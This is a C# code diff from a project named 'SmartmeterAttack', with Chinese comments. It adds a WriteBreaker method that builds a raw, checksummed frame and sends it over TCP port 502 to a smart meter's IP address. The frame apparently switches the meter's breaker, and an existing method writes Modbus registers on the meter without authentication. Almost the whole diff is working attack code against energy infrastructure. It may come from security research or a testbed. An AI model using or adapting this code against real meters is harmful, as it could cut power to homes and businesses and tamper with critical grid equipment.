@@ -6,6 +6,7 @@ using System.Net;
 using System.Net.Sockets;
 using Modbus.Device;
 
+
 namespace SmartmeterAttack
 {
     public class TCPSGInterface//TCP，用于读取电表数据的简单接口类
@@ -17,6 +18,31 @@ namespace SmartmeterAttack
         public TCPSGInterface(String meter_ipaddr)//参数为电表的IP地址
         {
             this.client = new TcpClient(meter_ipaddr, 502);
+        }
+        public void WriteBreaker(int address,int fun)
+        {
+            byte[] data = { 0x00, 0x01, 0x00, 0x00, 0x00, 0x08, 0x68, (byte)(address&((1<<8)-1)), 0x02, 0x03, 0x20, (byte)(address & ((1 << 8) - 1)), (byte)fun, 0x00}; // 使用十六进制赋值
+            int sum = 0;
+            for(int i=6;i<=12;i++)
+            {
+                sum += data[i];
+            }
+            data[13] = (byte)(sum & ((1 << 8) - 1));
+            NetworkStream stream = client.GetStream();
+            stream.Write(data, 0, data.Length);
+
+            byte[] buffer = new byte[10]; // 缓冲区大小根据你的数据大小进行调整
+            int bytesRead = stream.Read(buffer, 0, 9);
+
+            // 处理接收到的数据
+            byte[] receivedData = new byte[bytesRead];
+            Array.Copy(buffer, 0, receivedData, 0, bytesRead);
+
+            // 在这里对接收到的数据进行处理
+            // 根据你的数据格式和需求进行相应的解析和清除操作
+
+            // 清除接收到的数据
+            Array.Clear(buffer, 0, buffer.Length);
         }
         /// <summary>
         /// Simple Modbus TCP master read holding registers
@@ -106,7 +132,6 @@ namespace SmartmeterAttack
             //ushort[] holdregs = new ushort[4];
             ModbusIpMaster master = ModbusIpMaster.CreateIp(client);
             master.WriteSingleRegister(slaveID, startAddress, values);
-
         }
         /// <summary>
         /// 析构函数
